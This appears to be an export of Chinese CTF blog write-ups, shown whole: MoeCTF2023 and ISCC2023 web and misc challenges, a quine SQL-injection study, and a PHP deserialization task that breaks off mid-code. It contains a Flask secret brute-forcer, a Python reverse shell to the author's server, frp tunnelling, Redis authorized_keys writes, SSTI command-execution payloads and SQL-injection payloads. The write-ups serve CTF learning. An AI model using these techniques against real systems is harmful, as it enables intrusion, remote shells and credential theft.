[{"title":"MoeCTF2023_moeworld_Web","url":"/2023/09/20/MoeCTF2023-moeworld-Web/","content":"\n西电的新生赛题目还是不错的，（打打新生赛做下康复训练\n\n前面的题目就不讲了，感觉最后一题还挺好玩的，特此记录一下。\n\n# moeworld\n\n---\n\n## Part 1\n\n---\n\n首先做出来了前面的“出去旅游的心海”题目拿到了压缩包的密码，打开之后得到一个md文件和一个密码保护的hint.zip\n\n![moeworld.md](image-20230920153102126.png)\n\n接下来进入题目环境，上来是一个登录界面，随便注册一个账号登录发现是一个留言板应用：\n\n![留言板](image-20230920153308067.png)\n\n从留言板上可以看到，admin写出了session密钥的构造形式，看起来最后仅有16^4个组合，可以考虑进行密钥爆破进而进行session伪造。\n\n这里用到了这个工具：\n\n> [GitHub - noraj/flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder/Encoder](https://github.com/noraj/flask-session-cookie-manager)\n\n我利用这个工具写了一个小脚本用来爆破出session密钥：\n``` python\nfrom flask_session_cookie_manager3 import *\nimport itertools\nhex_digits = \"0123456789abcdef\"\ntest = \"eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6Im5ha2FpaSJ9.ZQqVzQ.-VZSo904utx0bTIORNSfyudXig4\" #一个session样本\nresult = itertools.product(hex_digits, hex_digits, hex_digits, hex_digits)\nfor r in result:\n    secret = \"This-random-secretKey-you-can't-get\"+\"\".join(r)\n    if FSCM.decode(test,secret):\n        print(secret)\n        break\n```\n\n这样可以很轻松爆出session密钥（这个是随机的并不通用，需要自己爆破）：\n![密钥](image-20230920154009075.png)\n\n同样是使用这个工具，首先看一下session解码后的格式：\n![解码](image-20230920154244515.png)\n\n语义还是比较清晰的，分别是权限和用户名，既然知道了如何构造以及构造所需要的密钥，那么下面就来伪造admin用户的session：\n\n![编码](image-20230920154529880.png)\n\n这样就进入到admin账户中：\n![留言板](image-20230920154614939.png)\n\n从留言板中可以看到多出来了这么一条，那这样思路就很明晰了，制造错误进入调试模式，进而命令执行。将session格式中的power键删掉。\n\n![构造不完整session](image-20230920154807306.png)\n\n替换原来的session后成功进入到调试模式，输入PIN码后可以在console中执行python命令。\n\n![调试模式](image-20230920155036721.png)\n\n可以在这里进行命令执行，但是感觉有些麻烦所以我这里直接用python反弹shell到我的云服务器。在服务器中使用命令\n\n```shel\nsudo nc -lvvnp 端口\n```\n\n使用nc监听一个指定端口，之后在调试模式中执行命令将/bin/sh反弹回来：\n\n``` python\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"服务器IP\",监听端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\n```\n\n![反弹shell](image-20230920155542961.png)\n\n这样在服务器中可以看到shell已经成功弹了出来，之后查看根目录，从根目录下能看到有flag文件和readme文件：\n\n![flag1](image-20230920155742805.png)\n\n这样我们就得到了第一部分flag和一些提示。\n\n## Part 2\n\n---\n\n在/app/tools目录下有fscan工具，内网概念比较宽泛，试了好几次c段和b段内网扫描，时间用得不是很长，可是依旧一无所获。突然想到可以找找内网主机相关记录缩小扫描范围，像/etc/hosts, /proc/net/tcp, /proc/net/udp, /proc/net/dev这些都会有主机记录，最后在/etc/hosts文件中锁定了内网网段：\n\n![内网主机记录](image-20230920160511670.png)\n\n那下面就使用fscan工具扫描一下**172.20.0.1/24**和**172.21.0.1/24**这两个网段，最终找到了需要的结果。\n\n![扫描结果](image-20230920160803597.png)\n\n这样，根据之前moeworld.md的内容，得到压缩包密码为：22-3306-6379-8080 （看样例我先入为主以为是三个的组合，于是进行了一波手动全排列也没得到答案QwQ），之后解开hint.zip得到了hint文件，改后缀txt得到下一步提示：\n\n![hint](image-20230920161110216.png)\n\n学习了一波frp，搞明白了使用方法。大概的流程为：\n\n```txt\n我的本地主机（kali）<==使用proxychains连接==>我的有公网IP的服务器（frps）<==>靶机（frpc）\n```\n\n因此我们首先需要将服务器与靶机建立连接，分别为服务器和靶机配置frps.ini和frpc.ini，注意这里在靶机的用户由于权限受限，因此需要到/tmp目录下写一个frpc.ini配置文件，之后再引用。这里直接贴出两个配置文件：\n\n```ini\n# frps.ini\n[common]\nbind_port = 服务器上建立连接的端口\ntoken = 随便设置一个token\n# frpc.ini\n[common]\nserver_addr = 服务器IP\nserver_port = 服务器上的建立连接的端口\ntoken = 对应上面的token\n\n[plugin_socks5]\ntype = tcp\nplugin = socks5\nremote_port = 服务器上的服务端口\n# 服务器端使用命令 sudo ./frps -c frps.ini开启服务\n# 靶机使用命令 /app/tools/frpc -c /tmp/frpc.ini开启服务\n```\n\n靶机如何写入配置文件？可以使用echo命令，-e参数来使能转义，配合重定向输出符号>来写入文件：\n```shell\necho -e '[common]\\nserver_addr = 服务器IP\\nserver_port = 服务器上建立连接的端口\\ntoken = 对应的token\\n\\n[plugin_socks5]\\ntype = tcp\\nplugin = socks5\\nremote_port = 服务器上的服务端口\\n' > frpc.ini\n```\n\n\n\n这样服务器和靶机就建立了连接，靶机的网络环境被穿透出来，在本地主机修改/etc/proxychains4.conf文件，最底部添加\n\n```txt\nsocks5 服务器IP 服务器上的服务端口\n```\n\n这样修改保存后，在本地主机执行命令前加入proxychains的前缀即可调用proxychains获得内网环境。下一步就是连接数据库了。数据库账号密码从何而来？在/app/dataSql.py文件中写好了数据库账号密码。\n\n```shel\nproxychians4 mysql -uroot -pThe_P0sswOrD_Y0u_Nev3r_Kn0w  -h172.20.0.3\n```\n\n![mysql](image-20230920163007290.png)\n\n下面就是正常的看数据库名，看表名，能看到有flag表，直接查询得到第二部分flag。（这里卡了两天，之前死活连接不上数据库，跟出题人联系后发现是靶机容器网卡有问题。。。以后有问题一定要及时与出题人联系）\n\n## Part 3\n\n---\n\n下面就是第三部分的flag了，轮到redis了。说到redis最著名的就是未授权访问了，使用redis-cli尝试直接进行连接并尝试执行info命令，可以看到成功带出info信息，确实存在redis未授权访问。\n\n![redis](image-20230920163521660.png)\n\n我这里alias pc=\"proxychains4\"了，相当于一个简写，写pc就代表了proxychains4.\n\n尝试直接写入公钥进行连接。我这里用的kali，其他linux发行版大同小异。首先在本地生成用来ssh连接的公钥和私钥：\n\n``` shell\nssh-keygen -t rsa\n```\n\n一路回车，在~/.ssh目录下能看到生成了两个文件，带有.pub后缀的就是公钥文件，使用cat查看内容\n\n在redis中分别执行命令：\n``` redis\nconfig set dir /root/.ssh\n\nconfig set dbfilename authorized_keys\n\nset key \"\\n\\n生成的公钥\\n\\n\"\n\nsave\n```\n\n这样当每一步都返回OK则写入成功，下面在本地主机中执行命令：\n\n``` shell\nproxychians4 ssh -i id_rsa root@172.20.0.2\n```\n\n![ssh连接](image-20230920164323585.png)\n\n这样就成功连接到主机，根目录下的flag即为第三部分flag，组合起来即为最终flag。\n\n完结~\n","tags":["CTF_比赛记录"]},{"title":"ISCC2023的朝花夕夕夕夕拾","url":"/2023/06/29/ISCC2023的朝花夕夕夕夕拾/","content":"\n又是蓝桥杯又是期末周什么的CTF搁置了好长一段时间，暑假开始恶补！\n\n## 老狼老狼几点了\n\n题目考察了一个反序列化逃逸还有MD5的构造前缀碰撞法，主要是这个MD5的构造前缀碰撞法之前没有遇到过，所以做题的时候直接在这一步卡住了。\n\n> 构造前缀碰撞法\n\n顾名思义，能够指定前缀，创造出两个前缀相同，内容不同，但MD5值相同的方法。使用到的工具在这里： [fastcoll](http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip) 。将前缀存到txt文件中，拖动到fastcoll上使用它打开，之后文件夹中会自动生成两个碰撞后文件，它们的MD5值相同。或者在命令行中-p指定文件进行生成。\n\n## where_is_your_love\n\n当时做的时候就卡在了pop链构造的最后一环了，现在再回头看这个pop链还是挺清晰的，只是有几块链接的触发方式有些生疏。链子的构造结构大致为：\n\n``` php\nclass boy::__destruct()\n↓\nclass girl::__call()\n↓\nclass helper::__isset()\n↓\nclass boy::__toString()\n↓\nclass helper::__get()\n↓\nclass love_story::love()\n```\n\n直接结合POC进行分析：\n``` php\n<?php\nclass boy {\n    public $like;\n    public function __construct($a)\n    {\n        $this->like=$a;\n    }\n}\nclass girl {\n    private $boyname;\n    public function __construct($a)\n    {\n        $this->boyname=$a;\n    }\n}\nclass helper {\n    private $name;\n    private $string;\n    public function __construct($string,$a) {\n        $this->string = $string;\n        $this->name=$a;\n    }\n}\nclass love_story {\n    public $fall_in_love = array(0=>\"girl_and_boy\");\n}\n$hp1=new helper(array('string' => [new love_story(),\"love\"]),'0');\n$bo1=new boy($hp1);\n$hp2=new helper('et3',$bo1);\n$gi1=new girl($hp2);\n$bo2=new boy($gi1);\n$final=serialize($bo2);\necho urlencode($final); \n```\n\n根据POC的顺序开始分析，由于这个pop链的最终目的是触发 ***echo flag;*** ，因此首先新建一个love_story类，在类中定义一个成员变量$fall_in_love，值为array(0=>\"girl_and_boy\")用于过love方法中的if判断，array_walk中的function第一个参数是值，第二个参数是键，于是如此构造可以正常触发if判断。之后新建一个helper类使用类中的\\_\\_get魔术方法调用love_story类中的love方法，传入变量后hp1对象的string为array('string' => [new love_story(),\"love\"])，为何要传string而不是name？再往上看\\_\\_get方法是boy中的\\_\\_tostring方法触发的，而触发时传入的$name的值正是字符串string，因此需要传string而不是name。之后就一步步来了，\\_\\_tostring由helper中的\\_\\_isset方法触发，因此hp2中的name应当是bo1。\\_\\_isset方法是由girl中的\\_\\_call触发的，因此gi1中的boyname需要为hp2，\\_\\_call方法是由boy中的\\_\\_destruct方法触发的，因此bo2中的like需要为gi1，如此一来pop链构造完成。\n\n看了别人的wp发现还远不止这么简单，之前也分理处一个公钥文件和一个无法打开的letter.php文件，拿到公钥文件后可以通过[在线解析](https://www.ssleye.com/ssltool/pub_asysi.html)进行公钥处理得到公钥的e和n，下面就需要将n进行质数分解。一般情况下n足够大，质数分解十分困难，但当p和q（p\\*q=n）相差很小或很大时可以比较轻松的进行分解，使用工具[yafu](https://sourceforge.net/projects/yafu/)进行分解，得到pq，之后根据公式e\\*d%p\\*q=1计算出d即为私钥，使用私钥对密文letter进行转换（letter.php的十六进制转换为十进制）得到加密脚本，使用python反向编写出解密脚本就能得到flag。下面python脚本作用为计算私钥d并将密文进行解密：\n\n```python \nfrom gmpy2 import gcd, invert, powmod\nfrom Crypto.Util.number import long_to_bytes\np=147080233415299360057845495186390765586922902910770748924042642102066002833475419563625282038534033761523277282491713393841245804046571337610325158434942879464810055753965320619327164976752647165681046903418924945132096866002693037715397450918689064404951199247250188795306045444756953833882242163199922206967\nq=147080233415299360057845495186390765586922902910770748924042642102066002833475419563625282038534033761523277282491713393841245804046571337610325158434942879464810055753965320619327164976752647165681046903418924945132096866002693037715397450918689064404951199247250188795306045444756953833882242163199922205709\nc=8530254588966829834455480951833906070732403148510679362017565373269750418176646166382400178332972934093607408789719445565168370783220246473879672034218470400732624257045578085540515891000814358767437128590401597444541696561481439298734912632565289036244550789132932902805182079009950598882089323755520241569224684015358042478580914974188294787845638991395473487016273040555985633410751273015735335845836542698535898307328352997348976696598676776174058972462475116192041274686219418443286829062909262677318075802057309325237728547222618694816652165687827001008767201596367396977903210658846434611166296693949845404303\nphi=(p-1)*(q-1)\ne=65537\nd = invert(e,phi)\nn=21632595061498942456591176284485458726074437255982049051386399661866343401307576418742779935973203520468696897782308820580710694887656859447653301575912839865540207043886422473424543631000613842175006881377927881354616669050512971265340129939652367389539089568185762381769176974757484155591541925924309034566325122477217195694622210444478497422147703839359963069352123250114163369656862332886519324535078617986837018261033100555378934126290111146362437878180948892817526628614714852292454750429061910217210651682864700027396878086089765753730027466491890569705897416499997534143482201450410155650707746775053846974603\nm=long_to_bytes(powmod(c,d,n))\nprint(m)\n```\n\n![letter.php解析出来的加密脚本](image-20230530145924968.png)\n","tags":["CTF_比赛记录"]},{"title":"ISCC个人挑战赛之练武题部分WP","url":"/2023/05/11/ISCC个人挑战赛之练武题部分WP/","content":"\n# MISC\n\n## 好看的维吾尔族小姐姐\n\n附件下载解压出来是一个没有后缀的名为“古力娜扎”的文件，使用winhex打开：\n\n![winhex打开古力娜扎](image-2023-05-06-165928.png)\n\n根据文件头判断是PNG图片，将文件后缀进行更改，得到一张图片：\n\n![古力娜扎](image-20230511213549906.png)\n\n图片很小，看起来比例也有点怪，根据经验怀疑是更改了大小，所以直接上010editor把大小改一下：\n\n![010editor](image-20230512142836658.png)\n\n在这里调用png的模板，把高度改的大一点，之后保存发现图片的下方藏着一张\"二维码\"：\n\n![更改高度后图片](image-20230512142959864.png)\n\n看起来像传统意义上的二维码，实际上又不是。这是一种特殊形式的二维码：**Data Matrix码**。通过一些其他的二维码扫描软件可以得到一串比较特殊的代码：\n\n![代码](image-2023-05-06-170125.png)\n\n这不就是反过来的unicode么！这时候才联想到题目的提示：维吾尔族同胞的说话方式，莫非是反着说？不太了解，把字符串反过来unicode解码拿到flag：\n\n![flag](image-2023-05-06-170146.png)\n\n# WEB\n\n## 羊了个羊\n\n题目上来玩游戏啊，第一关第二关无穷无尽。看到上面有三个按钮，充值关卡和上一关均正常使用，冲关秘技被disable了，查看一下页面源码：\n\n```html\n     <button class=\"btn\" @click=\"handleIscc\" disabled = true>冲关秘技</button>\n```\n\n这个button绑定了一个点击事件handleIscc，既然如此就在js中找一找这个：\n\n```js\nconst handleIscc = () =>{\n            data.cards.length = 3;\n            data.select.clear();\n          }\nconst handleSwitch = (type) => {\n\tif(type === 'prev') {\n    \tif(data.level === 1) {\n                window.alert('反向上分不行哦~');\n                return;\n              }\n              data.level--;\n    } else {\n      \tif(data.level === 100) {\n                window.alert('迎接你的最终挑战！');\n                return;\n              }\n```\n\n也能草草看到一些逻辑，通关100关才给flagQwQ，那就继续向下分析：\n\n```js\nif (!hasCards.length && level >= config.maxLevel) {\n                  {\n                  alert(\"U1ZORFEzdFJUVEJWWTNWNVEydFhkemRTY3pSME1UVmlibGt6T1U1TFZGWnRNemcyYUgwPQ==\");\n                  data.level = 1;\n                }\n\t\t\t}\n```\n\n这里首先一个判断是否还有剩余的没有消除掉的卡片，如果没有并且此时的层数大于设定的层数就会alert这段base64加密后的字符串，解密之后即为flag。\n\n## 小周的密码锁\n\n题目打开是四个表项，前三个已经分别填好了123，随便填一个之后再burpsuite中抓到验证的包，送到intruder模块单字符开爆！发包间隔要高，我试的1200ms间隔（没挂代理别给我ip封了）。说来也是碰巧，提交的get请求有两项：\n\n> http://47.94.14.162:10008/?password=4&password2=1\n\n按理说应该爆第一个password的来着，结果第一次爆成了password2，误打误撞一次成功：\n\n![burpsuite爆破](image-2023-05-10-152254.png)\n\n得到password2是5，直接访问得到php源码：\n\n```php\n<?php\n    function MyHashCode($str)\n    {\n        $h = 0;\n        $len = strlen($str);\n        for ($i = 0; $i < $len; $i++) {\n            $hash = intval40(intval40(40 * $hash) + ord($str[$i]));\n        }\n        return abs($hash);\n    }\n    \n    function intval40($code)\n    {\n        $falg = $code >> 32;\n        if ($falg == 1) {\n            $code = ~($code - 1);\n            return $code * -1;\n        } else {\n            return $code;\n        }\n    }\n    function Checked($str){\n        $p1 = '/ISCC/';\n        if (preg_match($p1, $str)){\n            return false;\n        }\n        return true;\n    }\n\n    function SecurityCheck($sha1,$sha2,$user){\n        \n        $p1 = '/^[a-z]+$/';\n        $p2 = '/^[A-Z]+$/';\n\n        if (preg_match($p1, $sha1) && preg_match($p2, $sha2)){\n            $sha1 = strtoupper($sha1);\n            $sha2 = strtolower($sha2);\n            $user = strtoupper($user);\n            $crypto = $sha1 ^ $sha2;\n        }\n        else{\n            die(\"wrong\");\n        }       \n\n        return array($crypto, $user);\n    }\n    error_reporting(0);\n    \n    $user = $_GET['username'];//user\n    $sha1 = $_GET['sha1'];//sha1\n    $sha2 = $_GET['‮⁦//sha2⁩⁦sha2'];\n    //‮⁦see me ⁩⁦can you \n\n    if (isset ($_GET['password'])) {\n        if ($_GET['password2'] == 5){\n            show_source(__FILE__);\n        }\n        else{\n            //Try to encrypt\n            if(isset($sha1) && isset($sha2) && isset($user)){\n                [$crypto, $user] = SecurityCheck($sha1,$sha2,$user);\n                if((substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)) && (substr(sha1($user),-6,6)) === 'a05c53'){//welcome to ISCC\n                    \n                    if((MyHashcode(\"ISCCNOTHARD\") === MyHashcode($_GET['password']))&&Checked($_GET['password'])){\n                        include(\"f1ag.php\");\n                        echo $flag;\n                    }else{\n                        die(\"就快解开了!\");\n                    }\n                    \n                }\n                else{\n                    die(\"真的想不起来密码了吗?\");\n                }\n            }else{\n                die(\"密钥错误!\");\n            }\n        }    \n    }        \n\n    mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));\n?>\n```\n\n开始分析，首先定义了四个函数MyHashCode、intval40、Checked以及SecurityCheck。之后get接收变量username、sha1以及“sha2”，这里sha2标引好是因为变量名并不是sha2：\n\n![sha2](image-20230512151205415.png)\n\n在vscode中可以看到get的变量名称有些怪，这里涉及到一些特殊的unicode字符，这些字符控制着整体字符串的打印方式，可以参考：\n\n> [这个符号竟然可以从右往左打印字符串 (qq.com)](https://mp.weixin.qq.com/s/lo2AiEloACLtCn2Ncle33A)\n\n解决办法就是提前进行url编码，传入时直接传入url编码：\n\n```php\n<?php\n$a = '‮⁦//sha2⁩⁦sha2';\necho urlencode($a);\n?>\n//%E2%80%AE%E2%81%A6%2F%2Fsha2%E2%81%A9%E2%81%A6sha2\n```\n\nok，下面继续分析。因为我们已经get传入了password，所以第一层if可以进入，并且第二层的password2=5也已经被我们爆出来了，我们需要进入到第二层if的else分支，password2不为5即可。之后第三层if需要传入username,sha1,以及那串特殊字符，进入后调用了SecurityCheck函数,该函数首先判断sha1是否全为小写字母，sha2是否全为大写字母，满足条件后将sha1转成大写，sha2转成小写，user转成大写，返回sha1和sha2的逐位异或和转大写的user。\n\n第四层的if有些棘手，需要让user的sha1值的后六位等于a05c53，同时返回的异或值的sha1值的后六位也等于a05c53。至于user可以写个脚本用递增的数字转字符串计算sha1进行碰撞，很快就能拿到第一个符合条件的：\n\n> user=14987637\n\n第二个的话只需要构造出sha1异或sha2等于user的值即可，随便写了个脚本跑出一张表：\n![异或表](image-20230512153023598.png)\n\n摘取**大写字符^小写字母=数字**的项逐个拼接构造，得到众多结果中的一个：\n\n> $sha1 = 'BBCBEGCE';\n> $sha2 = 'svzzrqpr';\n\n因为这个函数还会大小写相互转换，所以这里要对大小写提前转换一下，上面的是没转换前的。\n\n之后就是第五层的if了。第五层需要传入password，要求是password中不能出现ISCC并且将其传入后得到的结果与ISCCNOTHARD传入后相同。简单分析一下这个MyHashCode函数。这个函数逐位取传入的字符串，每次将hash变量乘以40传入intval40函数并将取到的字符的ascii码相加作为参数传入intval40函数，返回值即为本轮循环后的hash值，尝试本地运行找出每次for循环后的hash值：\n\n> 73|3003|120187|4807547|192301958|7692078399|307683136044|12307325441832|492293017673345|19691720706933882|787668828277355348|\n\n既然不能出现ISCC，那么就从这里作为切入点。看看如果不使用ISCC，能否构造出能够替换的字符串。至于intval40这个函数，看一下chatGPT的解释：\n\n> 这段代码是一个PHP函数，名为intval40，它的作用是将一个64位整数转换为40位整数。具体实现是通过判断最高位是否为1来确定是否需要进行补码操作，然后将结果返回。其中，如果最高位为1，则需要进行补码操作，将其转换为相应的负数。最后，返回40位整数的值。\n\n最高位不是1时直接返回，不会对传入值造成任何影响，那么就来测试一下，看看在开头的处理ISCC字符串时是否有影响：\n\n> 0000000000110000000000\n\n0代表直接返回，1代表进行补码操作，处理字符串时每个字符调用两次intval40，因此前面处理ISCC时intval40没有对hash的值造成任何影响，这样就使题目更加简单了。我们的思路现在变成了能否构造字符串替换ISCC。已知在处理ISCC时intval40不会对hash的值造成影响，因此只要我们构造的**字符串的开头几个字符生成的hash值在某一阶段与ISCCNOTHARD的开头相同，并且其后的字符与其保持一致**，就能够成功绕过这个限制条件，如何构造？已知开头的字符串ISCC四个阶段的hash值分别为73|3003|120187|4807547，我们能否构造出第二阶段的hash值等于73？hash的初值为0，第一次intval40的结果为0，与第一个字符的ascii值相加传入intval40得到第一阶段的hash值即为第一个字符的hash值，如果要在第二阶段的值为73的话，第二个字符的ascii值应为33，ascii中是叹号，因此我们可以将ISCCNOTHARD中的I替换为ascii为1的字符加上叹号，ascii为1的字符是非可见字符，经过url编码后为%01，传入即可拿到flag，最终payload：\n\n```te\npassword=%01!SCCNOTHARD&password2=1&username=14987637&sha1=bbcbegce&%E2%80%AE%E2%81%A6%2F%2F%73%68%61%32%E2%81%A9%E2%81%A6%73%68%61%32=SVZZRQPR\n```\n\n## chatGGG\n\n开头一个简易的对话界面，感觉可能是模板注入，输入双花括号之后符号会消失，+也会转义成“加”等等，还是做了一些过滤的。\n\nSSTI学得比较菜，在一些过滤绕过的文章中找到一些灵感\n\n> https://blog.csdn.net/weixin_52635170/article/details/129850863\n\n使用变量设置以及拼接的方式进行绕过，不妨从构造好的payload入手：\n\n```te\nask={%set pop=dict(po=a,p=b)|join%}\n{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}\n{%set kongge=(lipsum|string|list)|attr(pop)(9)%}\n{%set globals=(xiahuaxian,xiahuaxian,dict(glob=b,als=a)|join,xiahuaxian,xiahuaxian)|join%}\n{%set get=dict(g=b,et=a)|join%}\n{%set shell=dict(o=a,s=b)|join%}\n{%set popen=dict(po=b,pen=a)|join%}\n{%set builtins=(xiahuaxian,xiahuaxian,dict(buil=b,tins=a)|join,xiahuaxian,xiahuaxian)|join%}\n{%set ch=dict(ch=a,r=b)|join%}\n{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}\n{%set command=(char(99),char(97),char(116),char(32),char(102),char(108),char(108),char(108),char(97),char(97),char(103),char(46),char(116),char(120),char(116))|join%}\n{%set read=dict(re=b,ad=a)|join%}\n{%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%}\n{%print result%}\n```\n\n由于做了一些特殊符号以及单词的过滤，因此需要进行拼接构造或从其他位置取得，例如下划线，则是从**lipsum|string|list**中取得，lipsum是flask的一个方法，string则是转化为字符串，list则是将字符串转化为列表\n\n![lipsum](image-20230525205644417.png)\n\n第24个字符为下划线，因此使用pop（24）可以截取到下划线。\n\n``` tex\n1. lipsum|attr(\"__globals__\") 相当于 lipsum.__globals__\n2. (1,2)|join 相当于 12\n3. dit(a=1,b=2) 即将字典中的键进行拼接\n\n通过以上这些方法即可构造出与\n{%print ((lipsum)|attr(\"__globals__\")).get(\"os\").popen(\"cat ./flllaag.txt\").read()%}\n等效的payload\n```\n\n![chatGGG](image-2023-05-19-191223.png)\n\n# 实战题\n\n顺便附上实战第一阶段吧，第一阶段用到了**cve-2018-76602**，直接在网上找了个现成的poc直接打，账号密码弱口令（drupal,drupal）\n\n![实战](image-2023-05-24-164441.png)\n","tags":["CTF_比赛记录"]},{"title":"记一次Quino注入学习","url":"/2023/04/24/记一次Quino注入学习/","content":"\n之前做了一道题看别人的wp不明所以，搁置了一段时间再看豁然开朗。\n\n# 题目：CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection\n\n首先进入题目是一个登陆框，看了html源码发现有提示源码位置，进行查看：\n\n``` php\n<?php\ninclude_once(\"lib.php\");\nfunction alertMes($mes,$url){\n    die(\"<script>alert('{$mes}');location.href='{$url}';</script>\");\n}\n \nfunction checkSql($s) {\n    if(preg_match(\"/regexp|between|in|flag|=|>|<|and|\\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\\\\$|0x|sleep|\\ /i\",$s)){\n        alertMes('hacker', 'index.php');\n    }\n}\n \nif (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {\n    $username=$_POST['username'];\n    $password=$_POST['password'];\n    if ($username !== 'admin') {\n        alertMes('only admin can login', 'index.php');//username===admin\n    }\n    checkSql($password);\n    $sql=\"SELECT password FROM users WHERE username='admin' and password='$password';\";\n    $user_result=mysqli_query($con,$sql);\n    $row = mysqli_fetch_array($user_result);\n    if (!$row) {\n        alertMes(\"something wrong\",'index.php');\n    }\n    if ($row['password'] === $password) {//这个是关键\n    die($FLAG);\n    } else {\n    alertMes(\"wrong password\",'index.php');\n  }\n}\n \nif(isset($_GET['source'])){\n  show_source(__FILE__);\n  die;\n}\n?>\n```\n\n题目黑名单不是很死，通过各种符号以及函数的替代也可以注，但是重点不在此，重点在于题目中的判断\n\n> if ($row['password'] === $password)\n\n这样就引入了要学到的内容——Quino注入\n\n# Quino注入\n\nQuine又称为自产生程序，在sql注入中是一种使得输入的sql语句和输出的sql语句一致的技术，就是说输入的语句进行查询后生成的结果与输入的语句相同（自己生成自己），可以看到题目中的判断正是考察了这个点。\n\n## replace函数\n\n> replace(object, search, replace)\n\n此函数用于将object中的所有search替换为replace。\n\n```sql\nMariaDB [(none)]> select replace(\".\", char(46), \"!\");\n+-----------------------------+\n| replace(\".\", char(46), \"!\") |\n+-----------------------------+\n| !                           |\n+-----------------------------+\n1 row in set (0.000 sec)\n```\n\n可以看到能够成功替换。\n\n## 尝试使输入输出保持一致\n\n### 替换object\n\n尝试通过替换object使输入输出保持一致:\n\n``` sql\nMariaDB [(none)]> select replace('replace(\".\",char(46),\".\")',char(46),'.');\n+---------------------------------------------------+\n| replace('replace(\".\",char(46),\".\")',char(46),'.') |\n+---------------------------------------------------+\n| replace(\".\",char(46),\".\")                         |\n+---------------------------------------------------+\n1 row in set (0.000 sec)\n```\n\n还是差一点，只是将object中的字符串原样输出了，replace还没怎么用到，是否可以通过更改replace使输入输出保持一致？\n\n### 替换object+replace\n\n```sql\nMariaDB [(none)]> select replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")');\n+---------------------------------------------------------------------------+\n| replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")') |\n+---------------------------------------------------------------------------+\n| replace(\"replace(\".\",char(46),\".\")\",char(46),\"replace(\".\",char(46),\".\")\") |\n+---------------------------------------------------------------------------+\n1 row in set (0.000 sec)\n```\n\n可以看到确实长得差不多了，但还是有问题，包围object和replace的符号仍然有差异。object中的.被替换为了replace(\".\",char(46),\".\"),但包围.的引号为双引号，如果直接更改为单引号会造成最外层replace的object界限不明确，因此还需要再套一层replace，将双引号改为单引号。\n\n### 解决引号问题\n\n> ```sql\n> replace('\".\"',char(34),char(39))\n> ```\n\n语句将字符串中的双引号替换为了单引号，这就是解决引号问题的方法，即在object外再套一层replace将里面的双引号更改为单引号：\n\n```sql\nMariaDB [(none)]> select replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")');\n+------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') |\n+------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') |\n+------------------------------------------------------------------------------------------------------------------------------------------------------------+\n1 row in set (0.000 sec)\n```\n\n此时输入与输出可以保持一致了，先看最上面的一行的绿色部分，由于需要区分字符串的界限，因此字符串的外界（此时为单引号）与字符串内的引号要保持不同（此时为双引号），绿色部分外一层的replace的目的就是为了将字符串内的引号转换为与外界相同的引号（此时为单引号，即将字符串内的双引号改为单引号），这样就好办了，继续进行更外一层的replace，此时能够看到成功进行了Quine注入。\n\n那么如果我在开始直接将字符串的外界定义为双引号，这样字符串内的引号就变成了单引号，这样不就可以简化了嘛？结果是，在这种情况下，待查询语句的外侧变成了双引号，而结果变成了单引号，结果一样不同，因此最内层套的这个replace不能简化。\n\n### 总结\n\nQuine基本形式：\n\n>  replace(replace(‘str’,char(34),char(39)),char(46),‘str’)\n\n先将str里的双引号替换成单引号，再用str替换str里的.\n\nstr基本形式（可以理解成上面的\".\"）：\n\n>  replace(replace(\".\",char(34),char(39)),char(46),\".\")\n\n完整的Quine就是***Quine基本形式+str基本形式***\n\n回头再看题目的payload：\n\n> 1'/**/union/**/select/**/replace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#\n\nstr:\n\n> 1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#\n\nquine基本形式：\n\n> 1'/**/union/**/select/**/replace(replace('str',char(34),char(39)),char(46),'str')#\n","tags":["CTF_学习记录"]},{"title":"CTFHub_2020-网鼎杯-青龙组-AreUserialz","url":"/2023/04/07/CTFHub-2020-网鼎杯-青龙组-AreUserialz/","content":"\n题目上来直接展示源码：\n\n```php\n<?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n\n    private function read() {\n        $res = \"\";\n        